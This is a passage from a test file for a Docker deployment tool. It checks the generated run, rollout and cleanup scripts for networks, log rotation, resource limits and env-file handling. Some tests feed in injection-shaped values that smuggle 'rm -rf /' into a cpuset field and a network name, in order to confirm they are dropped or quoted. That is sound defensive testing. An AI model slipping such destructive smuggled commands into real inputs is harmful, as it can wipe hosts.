    expect(s).not.toContain("docker image inspect"); // a plain existence test can't tell absent from daemon-down
  });

  it("accepts a registry ref whose trailing segment is the app's namespace, dedupes, and drops foreign tags", () => {
    const s = buildImageRemoveScriptForTags("abc", [
      "tugra_abc:v1",
      "ghcr.io/org/tugra_abc:v1", // registry ref for THIS app → kept
      "tugra_abc:v1", // duplicate → collapsed
      "nginx:latest", // foreign → dropped
      "ghcr.io/org/tugra_other:v1", // another app's namespace → dropped
    ]);
    expect(s).toContain("'tugra_abc:v1'");
    expect(s).toContain("'ghcr.io/org/tugra_abc:v1'");
    expect(s).not.toContain("nginx:latest");
    expect(s).not.toContain("tugra_other");
    expect(s.match(/docker rmi 'tugra_abc:v1'/g)?.length).toBe(1); // deduped
  });

  it("is a no-op when no tag is in the app's namespace", () => {
    expect(buildImageRemoveScriptForTags("abc", ["nginx:latest", null, ""])).toBe("exit 0");
  });
});

describe("json-file log rotation", () => {
  it("logRotationArgs defaults to the 10m x 3 cap and defers when the operator sets a log flag", () => {
    expect(logRotationArgs(null)).toBe(LOG_ROTATION_ARGS);
    expect(logRotationArgs("")).toBe(LOG_ROTATION_ARGS);
    expect(logRotationArgs("--memory 256m")).toBe(LOG_ROTATION_ARGS);
    // Operator owns logging — our json-file opts would clash with a different driver, so emit nothing.
    expect(logRotationArgs("--log-driver journald")).toBe("");
    expect(logRotationArgs("--log-opt max-size=50m")).toBe("");
    expect(logRotationArgs('--log-driver=local --log-opt max-file=10')).toBe("");
  });

  it("the app run line carries the rotation cap by default", () => {
    expect(buildRunScript(base, "v1", false)).toContain(LOG_ROTATION_ARGS);
  });

  it("the app run line omits our cap when the operator set their own logging", () => {
    const s = buildRunScript({ ...base, dockerOptions: "--log-driver journald" }, "v1", false);
    expect(s).not.toContain("json-file");
  });

  it("the Traefik proxy run line carries the rotation cap", () => {
    expect(buildProxySetupScript({ acmeEmail: "me@x.com" })).toContain(LOG_ROTATION_ARGS);
  });
});

// ---------------------------------------------------------------------------------------------------------------
// Container ops + networking (stop grace, drain, restart retries, container alias, per-app networks, tugra-apps)
// ---------------------------------------------------------------------------------------------------------------
describe("container ops + networking", () => {
  const runLine = (s: string) => s.split("\n").find((l) => l.includes("docker run -d"))!;
  const gate = { retries: 10, intervalSec: 3, startPeriodSec: 5 };
  const sha = (s: string) => createHash("sha256").update(s).digest("hex");
  const withEnv: AppSpec = { ...base, env: { A: "1" } };
  const dom: AppSpec = { ...withEnv, domain: "x.com" };
  const rollingOpts = { probe: { kind: "httpExternal" as const, port: 80, path: "/" }, ...gate };

  describe("byte-identity matrix (golden values captured from the pre-change builders)", () => {
    it("domain app run line is unchanged", () => {
      expect(runLine(buildRunScript(dom, "v1"))).toBe("docker run -d --name tugra_abc --restart unless-stopped --log-driver json-file --log-opt max-size=10m --log-opt max-file=3 --env-file /etc/tugra/env/abc.env --network tugra-proxy --label 'traefik.enable=true' --label 'traefik.http.routers.tugra_abc.rule=Host(`x.com`)' --label 'traefik.http.routers.tugra_abc.entrypoints=websecure' --label 'traefik.http.routers.tugra_abc.tls.certresolver=le' --label 'traefik.http.services.tugra_abc.loadbalancer.server.port=80' --label 'traefik.http.routers.tugra_abc-web.rule=Host(`x.com`)' --label 'traefik.http.routers.tugra_abc-web.entrypoints=web' --label 'traefik.http.routers.tugra_abc-web.middlewares=tugra_abc-redirect' --label 'traefik.http.middlewares.tugra_abc-redirect.redirectscheme.scheme=https' 'tugra_abc:v1'");
    });
    it("domain + dbNetwork run line is unchanged (same single trailing cleanup + connect)", () => {
      expect(runLine(buildRunScript({ ...dom, dbNetwork: true }, "v1"))).toBe("docker run -d --name tugra_abc --restart unless-stopped --log-driver json-file --log-opt max-size=10m --log-opt max-file=3 --env-file /etc/tugra/env/abc.env --network tugra-proxy --label 'traefik.enable=true' --label 'traefik.http.routers.tugra_abc.rule=Host(`x.com`)' --label 'traefik.http.routers.tugra_abc.entrypoints=websecure' --label 'traefik.http.routers.tugra_abc.tls.certresolver=le' --label 'traefik.http.services.tugra_abc.loadbalancer.server.port=80' --label 'traefik.http.routers.tugra_abc-web.rule=Host(`x.com`)' --label 'traefik.http.routers.tugra_abc-web.entrypoints=web' --label 'traefik.http.routers.tugra_abc-web.middlewares=tugra_abc-redirect' --label 'traefik.http.middlewares.tugra_abc-redirect.redirectscheme.scheme=https' --label 'traefik.docker.network=tugra-proxy' 'tugra_abc:v1' && docker network connect tugra-net tugra_abc || { docker rm -f tugra_abc 2>/dev/null; false; }");
    });
    it("no-domain dbNetwork run line is unchanged", () => {
      expect(runLine(buildRunScript({ ...withEnv, dbNetwork: true }, "v1"))).toBe("docker run -d --name tugra_abc --restart unless-stopped --log-driver json-file --log-opt max-size=10m --log-opt max-file=3 --env-file /etc/tugra/env/abc.env --network tugra-net 'tugra_abc:v1'");
    });
    it("no-domain raw --network run line is unchanged (operator owns the network)", () => {
      expect(runLine(buildRunScript({ ...withEnv, dockerOptions: "--network mynet" }, "v1"))).toBe("docker run -d --name tugra_abc --restart unless-stopped --log-driver json-file --log-opt max-size=10m --log-opt max-file=3 '--network' 'mynet' --env-file /etc/tugra/env/abc.env 'tugra_abc:v1'");
    });
    it("whole swap scripts are unchanged when every new field is unset/null/0", () => {
      const unset: Partial<AppSpec> = { stopGracePeriodSec: null, drainSec: 0, restartMaxRetries: null, containerAlias: null, networks: [] };
      expect(sha(buildRunScript({ ...dom, ...unset }, "v1"))).toBe("7fb942d4aefb5a69ff453b3ac7013446ac2ea6a7a2c0eb41c3e6730a0dca1a74");
      expect(sha(buildRunScript({ ...dom, dbNetwork: true, ...unset }, "v1"))).toBe("c509ecc91b9514aea4799261efcc584f65b9899b4947c1085e1cf70a8ea2bd98");
      expect(sha(buildRollingDeployScript({ ...dom, ...unset }, "v2", rollingOpts))).toBe("e06315e0a60affaf7ec73d20397cde5837cf8937fdef4aa1aee32a9e65b0052d");
      expect(
        sha(buildRollingDeployScript({ ...dom, ...unset }, "v2", { ...rollingOpts, soak: { windowSec: 30, intervalSec: 5 } })),
      ).toBe("11959680e14e95aec9e60587388a28fde1897d550ebc0f68e3d5458c15c4987e");
      expect(
        sha(buildRecreateDeployScript({ ...withEnv, dbNetwork: true, hostPort: 8080, ...unset }, "v2", { probe: { kind: "stableWait" }, prevVersion: "v1", ...gate })),
      ).toBe("b0368331d6cd6a95a1f6d642dfedfdf44a8ed8ad9decd41c9cee694b611ee2b1");
      expect(sha(buildRunScript({ ...withEnv, dockerOptions: "--network mynet", ...unset }, "v1"))).toBe("0fad3ec7600ac783a3e75d09961669daa9d41755e54f476f5356b98a6e8007a3");
    });
  });

  describe("tugra-apps shared bridge (default for no-domain, no-db, no raw --network)", () => {
    it("emits --network tugra-apps before the image ref, and creates the network BEFORE the run line", () => {
      const s = buildRunScript(base, "v1");
      expect(runLine(s)).toContain("--network tugra-apps 'tugra_abc:v1'");
      expect(s).toContain("docker network create tugra-apps 2>/dev/null || true");
      expect(s.indexOf("docker network create tugra-apps")).toBeLessThan(s.indexOf("docker run -d"));
    });
    it("keeps the host-port publish after the network", () => {
      expect(runLine(buildRunScript({ ...base, hostPort: 8080 }, "v1"))).toContain("--network tugra-apps -p 8080:80");
    });
    it("a raw --network in dockerOptions: no tugra-apps, no create", () => {
      const s = buildRunScript({ ...base, dockerOptions: "--network mynet" }, "v1");
      expect(s).not.toContain("tugra-apps");
    });
    it("a routed or db-linked app never uses tugra-apps", () => {
      expect(buildRunScript(dom, "v1")).not.toContain("tugra-apps");
      expect(buildRunScript({ ...base, dbNetwork: true }, "v1")).not.toContain("tugra-apps");
    });
    it("a COMPOSE-source spec is never put on tugra-apps", () => {
      expect(appNetworkPlan({ ...base, source: "COMPOSE" }).primary).toBeNull();
    });
  });

  describe("restartMaxRetries", () => {
    it("on-failure + N renders on-failure:N", () => {
      expect(runLine(buildRunScript({ ...base, restartPolicy: "on-failure", restartMaxRetries: 5 }, "v1"))).toContain("--restart on-failure:5 ");
    });
    it("a count with any other policy is ignored", () => {
      expect(runLine(buildRunScript({ ...base, restartPolicy: "always", restartMaxRetries: 5 }, "v1"))).toContain("--restart always ");
      expect(runLine(buildRunScript({ ...base, restartMaxRetries: 5 }, "v1"))).toContain("--restart unless-stopped ");
    });
    it("out-of-range / non-integer counts emit no suffix", () => {
      for (const n of [0, -1, 1001, 1.5, Number.NaN]) {
        expect(runLine(buildRunScript({ ...base, restartPolicy: "on-failure", restartMaxRetries: n }, "v1"))).toContain("--restart on-failure ");
      }
    });
    it("a raw --restart in dockerOptions still follows and wins", () => {
      const l = runLine(buildRunScript({ ...base, restartPolicy: "on-failure", restartMaxRetries: 3, dockerOptions: "--restart no" }, "v1"));
      expect(l.indexOf("--restart on-failure:3")).toBeLessThan(l.indexOf("'--restart' 'no'"));
    });
  });

  describe("stopGracePeriodSec", () => {
    it("--stop-timeout sits after the log opts and before the image ref", () => {
      const l = runLine(buildRunScript({ ...base, stopGracePeriodSec: 45 }, "v1"));
      expect(l).toContain("--log-opt max-file=3 --stop-timeout 45 --network tugra-apps 'tugra_abc:v1'");
    });
    it("unset keeps the contiguous pinned run line", () => {
      expect(runLine(buildRunScript(base, "v1"))).toContain("--log-opt max-file=3 --network tugra-apps 'tugra_abc:v1'");
      expect(runLine(buildRunScript(base, "v1"))).not.toContain("--stop-timeout");
    });
    it("hard cutover: docker stop -t N precedes rm -f, and follows the rollback exit-7 guard", () => {
      const s = buildRunScript({ ...base, stopGracePeriodSec: 30 }, "old1", false);
      const guard = s.indexOf("exit 7");
      const stop = s.indexOf("docker stop -t 30 tugra_abc 2>/dev/null || true");
      const rm = s.indexOf("docker rm -f tugra_abc 2>/dev/null || true");
      expect(guard).toBeGreaterThan(-1);
      expect(stop).toBeGreaterThan(guard);
      expect(rm).toBeGreaterThan(stop);
    });
    it("recreate: graceful stop precedes the rm -f of the old container", () => {
      const s = buildRecreateDeployScript({ ...base, hostPort: 8080, stopGracePeriodSec: 30 }, "v2", { probe: { kind: "stableWait" }, ...gate });
      expect(s.indexOf("docker stop -t 30 tugra_abc")).toBeGreaterThan(-1);
      expect(s.indexOf("docker stop -t 30 tugra_abc")).toBeLessThan(s.indexOf("docker rm -f tugra_abc 2>/dev/null || true"));
    });
    it("rolling no-soak: drain, then stop, then rm -f (in that order) after the healthy check", () => {
      const s = buildRollingDeployScript({ ...dom, stopGracePeriodSec: 30, drainSec: 7 }, "v2", rollingOpts);
      const healthy = s.indexOf('if [ "$healthy" = 1 ]; then');
      const sleep = s.indexOf("sleep 7");
      const stop = s.indexOf("docker stop -t 30 tugra_abc 2>/dev/null || true");
      const rm = s.indexOf("docker rm -f tugra_abc 2>/dev/null || true", healthy);
      expect(healthy).toBeGreaterThan(-1);
      expect(sleep).toBeGreaterThan(healthy);
      expect(stop).toBeGreaterThan(sleep);
      expect(rm).toBeGreaterThan(stop);
    });
    it("rolling soak: drain then stop -t N canonical, both before the rename to __prev; revert/rollout removals stay rm -f", () => {
      const s = buildRollingDeployScript({ ...dom, stopGracePeriodSec: 30, drainSec: 7 }, "v2", { ...rollingOpts, soak: { windowSec: 30, intervalSec: 5 } });
      const sleep = s.indexOf("sleep 7");
      const stop = s.indexOf("docker stop -t 30 tugra_abc 2>/dev/null || true");
      const rename = s.indexOf("docker rename tugra_abc tugra_abc__prev");
      const reapPrev = s.indexOf("docker rm -f tugra_abc__prev");
      expect(sleep).toBeGreaterThan(-1);
      expect(sleep).toBeLessThan(reapPrev);
      expect(stop).toBeGreaterThan(sleep);
      expect(rename).toBeGreaterThan(stop);
      // the broken-new revert stop keeps its plain form; the never-served rollout is still hard-removed
      expect(s).toContain("      docker stop tugra_abc 2>/dev/null || true");
      expect(s).toContain("docker rm -f tugra_abc__rollout");
    });
    it("rollout (never-served) removals stay rm -f with no stop", () => {
      const s = buildRollingDeployScript({ ...dom, stopGracePeriodSec: 30 }, "v2", rollingOpts);
      expect(s).not.toContain("docker stop -t 30 tugra_abc__rollout");
    });
  });

  describe("drainSec", () => {
    it("recreate has no sleep (no overlapping container)", () => {
      const s = buildRecreateDeployScript({ ...withEnv, hostPort: 8080, drainSec: 9 }, "v2", { probe: { kind: "stableWait" }, ...gate });
      expect(s).not.toContain("sleep 9");
    });
    it("0 / null / out-of-range emit no sleep", () => {
      for (const n of [0, null, 301, -1, 2.5]) {
        expect(buildRollingDeployScript({ ...dom, drainSec: n }, "v2", rollingOpts)).not.toContain("draining");
      }
    });
    it("the hard-cutover run script never drains", () => {
      expect(buildRunScript({ ...base, drainSec: 9 }, "v1")).not.toContain("sleep 9");
    });
  });

  describe("containerAlias", () => {
    it("emits --network-alias + a tugra.alias label on the primary network, after networkAliases", () => {
      const l = runLine(buildRunScript({ ...base, networkAliases: ["api"], containerAlias: "stable" }, "v1"));
      expect(l).toContain("--network-alias 'api' --network-alias 'stable' --label 'tugra.alias=stable'");
    });
    it("works on the routed network too, and is absent from traefikLabels output", () => {
      expect(runLine(buildRunScript({ ...dom, containerAlias: "stable" }, "v1"))).toContain("--network-alias 'stable'");
      expect(traefikLabels({ ...dom, containerAlias: "stable" }).join("\n")).not.toContain("tugra.alias");
    });
    it("repeats the alias on every connect", () => {
      const l = runLine(buildRunScript({ ...dom, dbNetwork: true, containerAlias: "stable", networks: ["extra"] }, "v1"));
      expect(l).toContain("docker network connect --alias 'stable' tugra-net tugra_abc");
      expect(l).toContain("docker network connect --alias 'stable' 'extra' tugra_abc");
    });
    it("is not emitted with a raw --network", () => {
      const l = runLine(buildRunScript({ ...base, dockerOptions: "--network mynet", containerAlias: "stable" }, "v1"));
      expect(l).not.toContain("--network-alias");
      expect(l).not.toContain("tugra.alias");
    });
  });

  describe("per-app networks", () => {
    const c = (s: string) => runLine(s);
    it("a routed app attaches each user network via connect, with ONE trailing cleanup", () => {
      const l = c(buildRunScript({ ...dom, networks: ["a", "b"] }, "v1"));
      expect(l).toContain("&& docker network connect 'a' tugra_abc && docker network connect 'b' tugra_abc || { docker rm -f tugra_abc 2>/dev/null; false; }");
      expect(l.match(/docker rm -f/g)).toHaveLength(1);
    });
    it("creates every network before the run line", () => {
      const s = buildRunScript({ ...dom, networks: ["a", "b"] }, "v1");
      const run = s.indexOf("docker run -d");
      expect(s.indexOf("docker network create --label tugra.managed=true 'a'")).toBeGreaterThan(-1);
      expect(s.indexOf("docker network create --label tugra.managed=true 'a'")).toBeLessThan(run);
      expect(s.indexOf("docker network create --label tugra.managed=true 'b'")).toBeLessThan(run);
    });
    it("pins Traefik to tugra-proxy only when the routed app has extra networks", () => {
      expect(c(buildRunScript({ ...dom, networks: ["a"] }, "v1"))).toContain("traefik.docker.network=tugra-proxy");
      expect(c(buildRunScript(dom, "v1"))).not.toContain("traefik.docker.network");
    });
    it("a network equal to the primary is dropped; tugra-apps is the primary for a bare app", () => {
      const l = c(buildRunScript({ ...base, networks: ["tugra-apps", "a"] }, "v1"));
      expect(l).toContain("--network tugra-apps");
      expect(l).toContain("docker network connect 'a' tugra_abc");
      expect(l).not.toContain("docker network connect 'tugra-apps'");
    });
    it("names are shell-quoted", () => {
      expect(buildRunScript({ ...dom, networks: ["a"] }, "v1")).toContain("docker network create --label tugra.managed=true 'a' 2>/dev/null || true");
    });
    it("a raw --network gives none of it", () => {
      const s = buildRunScript({ ...base, dockerOptions: "--network mynet", networks: ["a"] }, "v1");
      expect(s).not.toContain("network connect");
      expect(s).not.toContain("network create");
    });
  });

  describe("pre-deploy hook network", () => {
    const git: AppSpec = { ...base, source: "GIT", gitUrl: "https://github.com/acme/app.git", gitBranch: "main", preDeployCommand: "migrate" };
    const hook = (s: string) => s.split("\n").find((l) => l.includes("docker run --rm"))!;
    it("dbNetwork still uses tugra-net", () => {
      expect(hook(buildRunScript({ ...git, dbNetwork: true }, "v1", true))).toContain("--network tugra-net");
    });
    it("the app's first user network is used otherwise", () => {
      expect(hook(buildRunScript({ ...git, networks: ["a", "b"] }, "v1", true))).toContain("--network 'a'");
    });
    it("default (no networks) gets no --network and never tugra-apps", () => {
      expect(hook(buildRunScript(git, "v1", true))).not.toContain("--network");
    });
  });

  describe("boundedInt guards", () => {
    it("rejects 0, negatives, floats and over-range values (no token emitted)", () => {
      for (const n of [0, -5, 1.5, 3601]) {
        expect(runLine(buildRunScript({ ...base, stopGracePeriodSec: n }, "v1"))).not.toContain("--stop-timeout");
        expect(buildRunScript({ ...base, stopGracePeriodSec: n }, "v1")).not.toContain("docker stop -t");
      }
    });
  });

  describe("appNetworkPlan / internalHostFor", () => {
    it("table over every placement", () => {
      expect(appNetworkPlan(base)).toEqual({ primary: "tugra-apps", connect: [], all: ["tugra-apps"] });
      expect(appNetworkPlan(dom)).toEqual({ primary: "tugra-proxy", connect: [], all: ["tugra-proxy"] });
      expect(appNetworkPlan({ ...dom, dbNetwork: true })).toEqual({ primary: "tugra-proxy", connect: ["tugra-net"], all: ["tugra-proxy", "tugra-net"] });
      expect(appNetworkPlan({ ...base, dbNetwork: true })).toEqual({ primary: "tugra-net", connect: [], all: ["tugra-net"] });
      expect(appNetworkPlan({ ...base, networks: ["a"] })).toEqual({ primary: "tugra-apps", connect: ["a"], all: ["tugra-apps", "a"] });
      expect(appNetworkPlan({ ...base, dockerOptions: "--network x", networks: ["a"] })).toEqual({ primary: null, connect: [], all: [] });
      expect(appNetworkPlan({ ...base, source: "COMPOSE" }).primary).toBeNull();
    });
    it("internalHostFor mirrors the plan; null for compose and raw --network", () => {
      expect(internalHostFor({ ...base, networkAliases: ["api"], containerAlias: "stable", containerPort: 3000 })).toEqual({
        host: "tugra_abc",
        port: 3000,
        networks: ["tugra-apps"],
        aliases: ["api", "stable"],
      });
      expect(internalHostFor({ ...base, containerPort: null })?.port).toBe(80);
      expect(internalHostFor({ ...base, dockerOptions: "--network x" })).toBeNull();
      expect(internalHostFor({ ...base, source: "COMPOSE" })).toBeNull();
    });
  });
});

describe("extra resource limits (swap, cpu shares, cpuset, pids, shm)", () => {
  const runLine = (s: string) => s.split("\n").find((l) => l.includes("docker run -d"))!;
  const withLimits = (extra: Partial<AppSpec>) => runLine(buildRunScript({ ...base, ...extra }, "v1"));

  it("defaults are byte-identical: unset, null and a memory/cpus-only spec emit no new flag", () => {
    const plain = buildRunScript(base, "v1");
    const nulls = buildRunScript({ ...base, memorySwapMb: null, pidsLimit: null, shmSizeMb: null, cpuShares: null, cpusetCpus: null }, "v1");
    expect(nulls).toBe(plain);
    expect(buildRunScript({ ...base, cpusetCpus: "" }, "v1")).toBe(plain);
    expect(runLine(plain)).not.toMatch(/--memory-swap|--cpu-shares|--cpuset-cpus|--pids-limit|--shm-size/);
    // the pre-existing pair stays contiguous and in its original place
    expect(withLimits({ memoryMb: 256, cpus: 0.5 })).toContain("--log-opt max-file=3 --memory 256m --cpus 0.5 --network tugra-apps 'tugra_abc:v1'");
  });

  it("emits every flag, in a fixed order, right after --memory/--cpus", () => {
    const l = withLimits({ memoryMb: 256, memorySwapMb: 512, cpus: 0.5, cpuShares: 512, cpusetCpus: "0-1,3", pidsLimit: 200, shmSizeMb: 128 });
    expect(l).toContain("--memory 256m --memory-swap 512m --cpus 0.5 --cpu-shares 512 --cpuset-cpus '0-1,3' --pids-limit 200 --shm-size 128m --network tugra-apps 'tugra_abc:v1'");
  });

  it("-1 is unlimited for swap and pids (tested with != null, not truthiness)", () => {
    const l = withLimits({ memoryMb: 256, memorySwapMb: -1, pidsLimit: -1 });
    expect(l).toContain("--memory 256m --memory-swap -1 ");
    expect(l).toContain("--pids-limit -1 ");
  });

  it("drops swap when there is no memory limit (Docker rejects --memory-swap alone)", () => {
    expect(withLimits({ memorySwapMb: 512 })).not.toContain("--memory-swap");
  });

  it("drops out-of-range or malformed values instead of interpolating them", () => {
    const l = withLimits({ memoryMb: 256, memorySwapMb: 8, pidsLimit: 0, shmSizeMb: 0, cpuShares: 1, cpusetCpus: "0-1; rm -rf /" });
    expect(l).not.toMatch(/--memory-swap|--pids-limit|--shm-size|--cpu-shares|--cpuset-cpus|rm -rf/);
  });

  it("the cpuset is single-quoted", () => {
    expect(withLimits({ cpusetCpus: "0,2" })).toContain("--cpuset-cpus '0,2'");
  });

  it("limit flags come before dockerOptions, so a raw flag the operator sets wins", () => {
    const l = withLimits({ memoryMb: 256, shmSizeMb: 64, dockerOptions: "--shm-size 1g" });
    expect(l.indexOf("--shm-size 64m")).toBeGreaterThan(-1);
    expect(l.indexOf("--shm-size 64m")).toBeLessThan(l.indexOf("'--shm-size' '1g'"));
  });
});

describe("delete cleanup: network prune and build cache", () => {
  const gated = (n: string) => `docker network inspect -f '{{index .Labels "tugra.managed"}}' ${n} 2>/dev/null | grep -qx true && docker network rm ${n} 2>/dev/null || true`;
  const vols = [{ name: "data", path: "/app/data" }];

  it("defaults are byte-identical: no opts, empty networks, and undefined all give the old script", () => {
    const old = [
      "docker rm -f tugra_abc 2>/dev/null || true",
      "docker volume rm tugra_appv_abc_data 2>/dev/null || true",
      "rm -rf /etc/tugra/builds/abc /etc/tugra/builds/abc.plan.json",
    ].join("\n");
    expect(buildRemoveScript({ id: "abc" }, vols)).toBe(old);
    expect(buildRemoveScript({ id: "abc" }, vols, {})).toBe(old);
    expect(buildRemoveScript({ id: "abc" }, vols, { networks: [] })).toBe(old);
    expect(buildRemoveScript({ id: "abc" }, vols, { networks: undefined })).toBe(old);
  });

  it("emits one label-gated, quoted network rm per name, after the container and volumes and before the build tree", () => {
    const lines = buildRemoveScript({ id: "abc" }, vols, { networks: ["backend", "api-net"] }).split("\n");
    expect(lines).toEqual([
      "docker rm -f tugra_abc 2>/dev/null || true",
      "docker volume rm tugra_appv_abc_data 2>/dev/null || true",
      gated("'backend'"),
      gated("'api-net'"),
      "rm -rf /etc/tugra/builds/abc /etc/tugra/builds/abc.plan.json",
    ]);
    for (const l of lines.filter((x) => x.includes("network rm"))) expect(l).toContain("network inspect"); // never inspect-less
  });

  it("de-duplicates, and quotes an injection-shaped name", () => {
    const s = buildRemoveScript({ id: "abc" }, [], { networks: ["a", "a", "x'; rm -rf / #"] });
    expect(s.match(/docker network rm 'a'/g)).toHaveLength(1);
    expect(s).toContain(`docker network rm 'x'\\''; rm -rf / #'`);
    expect(s).not.toMatch(/docker network rm x/);
  });

  it("re-filters reserved and shared names even if a caller passes them", () => {
    const s = buildRemoveScript({ id: "abc" }, [], { networks: ["tugra-proxy", "tugra-net", "tugra-apps", "bridge", "host", "tugra-swarm", "ok"] });
    expect(s.match(/network rm/g)).toHaveLength(1);
    expect(s).toContain(gated("'ok'"));
    for (const r of ["tugra-proxy", "tugra-net", "tugra-apps", "bridge", "host", "tugra-swarm"]) expect(s).not.toContain(`'${r}'`);
  });

  it("buildBuildCachePruneScript is the dangling-only prune (no -a)", () => {
    expect(buildBuildCachePruneScript()).toBe("docker builder prune -f 2>/dev/null || true");
  });

  it("the user-network create line carries the ownership label; DB_NET and tugra-apps lines are unchanged", () => {
    const s = buildRunScript({ ...base, domain: "a.example.com", dbNetwork: true, networks: ["a"] }, "v1");
    expect(s).toContain("docker network create --label tugra.managed=true 'a' 2>/dev/null || true");
    expect(s).toContain("docker network create tugra-net 2>/dev/null || true");
    expect(buildRunScript(base, "v1")).toContain("docker network create tugra-apps 2>/dev/null || true");
  });
});

describe("envFileContent — fail-closed render guard", () => {
  it("throws on a value with LF/CR/NUL naming the key but never the value", () => {
    for (const v of ["a\nINJECTED=1", "a\rb", "a\u0000b"]) {
      expect(() => envFileContent({ SECRET_K: v })).toThrow(/"SECRET_K" contains a line break or NUL/);
      try {
        envFileContent({ SECRET_K: v });
      } catch (e) {
        expect((e as Error).message).not.toContain("INJECTED");
      }
    }
  });
  it("throws on an empty key or one with =, CR, LF or NUL", () => {
    for (const k of ["", "A=B", "A\nB", "A\rB", "A\u0000B"]) {
      expect(() => envFileContent({ [k]: "v" })).toThrow(/is not valid for an env file/);
    }
  });
  it("does not tighten the key policy (dotted, dashed and # keys still render)", () => {
    expect(envFileContent({ "spring.profiles.active": "x", "my-key": "y" })).toBe("spring.profiles.active=x\nmy-key=y");
  });
  it("b64Keys are emitted as KEY:b64=<base64> and may carry line breaks", () => {
    expect(envFileContent({ A: "1", PEM: "l1\nl2\n" }, new Set(["PEM"]))).toBe(`A=1\nPEM:b64=${Buffer.from("l1\nl2\n").toString("base64")}`);
    expect(Buffer.from(envFileB64({ PEM: "x\ny" }, new Set(["PEM"])), "base64").toString()).toBe(`PEM:b64=${Buffer.from("x\ny").toString("base64")}`);
  });
});

describe("per-variable env flags — docker run transport", () => {
  const PEM = "-----BEGIN KEY-----\nRAWPEMBODY\n-----END KEY-----\n";
  const mlApp: AppSpec = { ...base, env: { A: "1", PEM_KEY: PEM }, envMeta: { PEM_KEY: { multiline: true } } };
  const gate = { retries: 1, intervalSec: 1, startPeriodSec: 0 };
  const probe = { kind: "stableWait" as const };
  const dockerRuns = (s: string) => s.split("\n").flatMap((l) => l.match(/(?:env (?:\S+="\$TUGRA_ML_\d+" )+)?docker run -d[^\n]*/g) ?? []);

  it("flag-free apps are byte-identical (golden)", () => {
    const flagFree: AppSpec = { ...base, env: { A: "1", B: "two" } };
    const withEmptyMeta: AppSpec = { ...flagFree, envMeta: {} };
    expect(buildRunScript(withEmptyMeta, "v1", true)).toBe(buildRunScript(flagFree, "v1", true));
    expect(buildRunScript(flagFree, "v1", true)).toContain("--env-file /etc/tugra/env/abc.env");
    expect(buildRunScript(flagFree, "v1", true)).not.toContain("TUGRA_ML");
  });

  it("a multiline var is absent from the env file, passed by name, and prefixed on the docker run", () => {
    const s = buildRunScript(mlApp, "v1", true);
    const filePayload = s.match(/printf %s '([A-Za-z0-9+/=]+)' \| base64 -d > \/etc\/tugra\/env\/abc\.env/)!;
    expect(Buffer.from(filePayload[1], "base64").toString()).toBe("A=1"); // PEM_KEY is NOT in the env file
    expect(s).toContain("--env-file /etc/tugra/env/abc.env");
    expect(s).toContain("-e PEM_KEY");
    expect(s).toContain('env PEM_KEY="$TUGRA_ML_0" docker run -d --name tugra_abc');
    expect(s).not.toContain("RAWPEMBODY"); // only base64 ever appears
    expect(s).toContain("TUGRA_ENV_ML: 1 multiline variable(s)");
    expect(s).not.toMatch(/export /); // never exported script-wide
  });

  it("when EVERY variable is multiline there is no env file and no --env-file flag", () => {
    const s = buildRunScript({ ...base, env: { PEM_KEY: PEM }, envMeta: { PEM_KEY: { multiline: true } } }, "v1", true);
    expect(s).not.toContain("--env-file");
    expect(s).not.toContain("mkdir -p /etc/tugra/env");
    expect(s).toContain('env PEM_KEY="$TUGRA_ML_0" docker run -d');
  });

  it("when every variable is multiline or build-only the previous plaintext env file is removed; flag-free apps never emit an rm", () => {
    const allMl = buildRunScript({ ...base, env: { PEM_KEY: PEM }, envMeta: { PEM_KEY: { multiline: true } } }, "v1", true);
    expect(allMl).toContain("rm -f /etc/tugra/env/abc.env");
    expect(allMl.indexOf("rm -f /etc/tugra/env/abc.env")).toBeLessThan(allMl.indexOf("docker run -d"));
    const allBuildOnly = buildRunScript({ ...base, env: {}, envMeta: { T: { buildTime: true, runtime: false } } }, "v1", true);
    expect(allBuildOnly).toContain("rm -f /etc/tugra/env/abc.env");
    // a plain variable remains: the file is rewritten, never removed
    expect(buildRunScript(mlApp, "v1", true)).not.toContain("rm -f /etc/tugra/env/abc.env");
    expect(buildRunScript({ ...base, env: {} }, "v1", true)).not.toContain("rm -f /etc/tugra/env/abc.env");
    expect(buildRunScript({ ...base, env: { A: "1" } }, "v1", true)).not.toContain("rm -f /etc/tugra/env/abc.env");
  });

  it("the script-size preflight also guards build-time values (shell-quoted into the script) and the build-only script", () => {
    const huge = "'".repeat(40 * 1024); // each ' costs 4 bytes once quoted
    const buildApp: AppSpec = { ...base, source: "GIT", gitUrl: "https://github.com/a/b.git", buildType: "DOCKERFILE", env: { B: huge }, envMeta: { B: { buildTime: true } }, buildArgs: { B: huge }, buildFlagKeys: ["B"] };
    expect(() => buildRunScript(buildApp, "v1", true)).toThrow(/limit 122880/);
    expect(() => buildBuildOnlyScript(buildApp, "v1")).toThrow(/limit 122880/);
    // unflagged oversize env keeps today's behaviour
    expect(() => buildBuildOnlyScript({ ...buildApp, envMeta: undefined, buildFlagKeys: undefined }, "v1")).not.toThrow();
  });

  it("EVERY docker run -d carries the prefix: normal, rolling (incl. relabel), recreate (incl. rollback)", () => {
    const check = (s: string) => {
      const runs = s.match(/docker run -d/g) ?? [];
      const prefixed = s.match(/env PEM_KEY="\$TUGRA_ML_0" docker run -d/g) ?? [];
      expect(runs.length).toBeGreaterThan(0);
      expect(prefixed).toHaveLength(runs.length);
    };
    check(buildRunScript(mlApp, "v1", true));
    check(buildRunScript(mlApp, "v1", false)); // rollback
    const domained = { ...mlApp, domain: "app.example.com" };
    check(buildRollingDeployScript(domained, "v2", { probe: { kind: "httpExternal", port: 80, path: "/" }, ...gate }));
    check(buildRollingDeployScript(domained, "v2", { probe: { kind: "httpExternal", port: 80, path: "/" }, soak: { windowSec: 30, intervalSec: 5, failThreshold: 2 } as never, ...gate }));
    check(buildRecreateDeployScript({ ...mlApp, hostPort: 8080 }, "v2", { prevVersion: "v1", probe, ...gate }));
    expect(dockerRuns(buildRecreateDeployScript({ ...mlApp, hostPort: 8080 }, "v2", { prevVersion: "v1", probe, ...gate })).length).toBe(2);
  });

  it("the pre-deploy hook container sees the multiline var too (prefix + -e on its docker run)", () => {
    const s = buildRunScript({ ...mlApp, source: "GIT", gitUrl: "https://github.com/a/b.git", buildType: "NIXPACKS", preDeployCommand: "migrate" }, "v1", true);
    expect(s).toMatch(/if env PEM_KEY="\$TUGRA_ML_0" docker run --rm --env-file \/etc\/tugra\/env\/abc\.env -e PEM_KEY /);
  });

  it("two multiline vars are indexed by sorted key", () => {
